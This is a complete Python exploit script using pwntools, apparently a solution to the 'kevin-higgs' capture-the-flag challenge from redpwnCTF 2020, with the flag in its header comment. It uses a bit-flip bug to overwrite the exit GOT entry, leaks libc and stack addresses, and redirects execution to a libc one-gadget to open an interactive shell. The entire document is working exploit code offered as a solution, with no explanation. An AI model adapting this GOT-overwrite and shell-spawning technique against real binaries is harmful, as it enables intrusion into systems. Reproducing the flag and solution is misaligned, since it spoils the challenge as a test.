#exploit for kevin-higgs
#flag{kmh_<3333333333333334444}
from pwn import *
import math
target=remote('2020.redpwnc.tf',31956)
libc=ELF('./libc6-i386_2.28-10_amd64.so')
exitgot=0x804C01C
def addr(addr):
	return hex(addr)[2:9]
def addr2(addr):
	return hex(addr)[2:10]
addr1=addr(exitgot)
def flip(addr,index):
	for i in range(2):
		target.recvuntil("32): ")
		target.sendline(addr[i])
		target.recvuntil("7): ")
		target.sendline(str(index[i]))
		target.recvlines(2)
def flipleak(addr):
	for i in range(2):
		target.recvuntil("32): ")
		target.sendline(addr)
		target.recvuntil("7): ")
		target.sendline(str(0))
		target.recvuntil("byte: ")
		leak=target.recvline().strip("\n")
	return p8(int(leak,16))
def flip1(addr,index):
	target.recvuntil("32): ")
	target.sendline(addr)
	target.recvuntil("7): ")
	target.sendline(str(index))
	target.recvlines(2)
faddr=0x804c090
flip([addr1,addr1],[4,6])
flip([addr(faddr),addr(faddr)],[0,1])
setvbufgot=0x0804c028
libc_leak=""
for j in range(4):
	libc_leak+=flipleak(addr(setvbufgot+j))
libc_setvbuf=u32(libc_leak)
libc_base=libc_setvbuf-libc.symbols["setvbuf"]
libc_environ=libc_base+libc.symbols["environ"]
stack_leak=""
for j in range(4):
	stack_leak+=flipleak(addr2(libc_environ+j))
stack_leak=u32(stack_leak)
stack_off=0xffacd5e4-0xfface0bc
stack_addr=stack_leak+stack_off
flip1(addr2(stack_addr),5)
gadget=0x68fcc
libc_gadget=libc_base+gadget
cur="80490d6"
fin=addr2(libc_gadget)
bincur="{0:032b}".format(int(cur, 16))
binfin="{0:032b}".format(int(fin, 16))
count=0
for i in range(32):
	j=31-i
	if(bincur[j]!=binfin[j]):
		offset=i/8
		index=i-8*offset
		flip1(addr(exitgot+offset),index)
		count+=1
for i in range(34-count-1):
	flip1(addr(0x804c000),0)
target.interactive()
		
